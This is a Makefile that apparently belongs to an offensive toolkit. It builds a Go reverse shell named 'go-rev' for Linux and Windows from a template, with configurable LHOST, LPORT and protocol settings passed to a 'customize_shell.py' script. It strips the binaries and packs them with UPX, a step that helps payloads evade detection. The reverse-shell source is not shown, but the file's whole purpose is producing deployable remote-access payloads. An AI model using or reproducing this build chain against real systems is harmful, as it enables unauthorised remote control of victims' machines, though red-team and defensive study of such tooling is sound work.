################################################
LHOST=""
LPORT="443"
PROTO="tcp"
################################################

flags = -ldflags="-s -w"
release = release/
linux-release = $(release)linux/
windows-release = $(release)windows/
rev = go-rev
src = $(rev).go
template = $(src).template


.PHONY: all setup clean

all: $(windows-release)$(rev).upx $(linux-release)$(rev).upx

windows-packed: $(windows-release)$(rev).upx
linux-packed: $(linux-release)$(rev).upx

linux-rev: $(linux-release)$(rev)
windows-rev: $(windows-release)$(rev)

$(windows-release)$(rev).upx: $(windows-release)$(rev)
	upx -f $(windows-release)$(rev) -o $(windows-release)$(rev).upx
	touch $(windows-release)$(rev).upx

$(linux-release)$(rev).upx: $(linux-release)$(rev)
	upx -f $(linux-release)$(rev) -o $(linux-release)$(rev).upx
	touch $(linux-release)$(rev).upx

$(linux-release)$(rev):  $(src)
	GOOS=linux GOARCH=386 go build $(flags) -o $(linux-release)$(rev) $(rev).go

$(windows-release)$(rev):    $(src)
	GOOS=windows GOARCH=386 go build $(flags) -o $(windows-release)$(rev) $(rev).go

$(src):   $(template)
	../../customize_shell.py --PROTO $(PROTO) --LHOST $(LHOST) --LPORT $(LPORT) $(template) | tee $(src).tmp
	cmp --silent $(src).tmp $(src) || cp $(src).tmp $(src)
	rm $(src).tmp
	
clean:
	rm -f $(linux-release)*
	rm -f $(windows-release)*
	rm -f $(src)

setup: 
	apt install golang upx -y
	go get crypto/tls
	mkdir -p $(linux-release)
	mkdir -p $(windows-release)
